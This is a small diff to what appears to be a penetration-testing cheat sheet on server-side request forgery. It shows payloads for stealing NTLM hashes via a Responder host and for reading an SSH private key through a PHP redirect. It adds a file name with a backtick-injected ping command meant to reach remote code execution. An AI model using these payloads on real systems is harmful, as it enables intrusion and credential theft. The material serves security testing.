@@ -514,6 +514,10 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 - If the target runs Windows, try to steal NTLM hashes with Responder [[Reference](https://twitter.com/hacker_/status/1694554700555981176)]
   - `/vulnerable?url=http://your-responder-host`
 - `<?php header('Location: file:///Users/p4yl0ad/.ssh/id_rsa');?>`
+- If the app saves files locally but doesn't change the file name, you might RCE. This works on Linux:
+  ```
+  "pippo.pdf`ping my.burpcollaborator.org"
+  ```
 
 **Common endpoints**
 - Webhooks
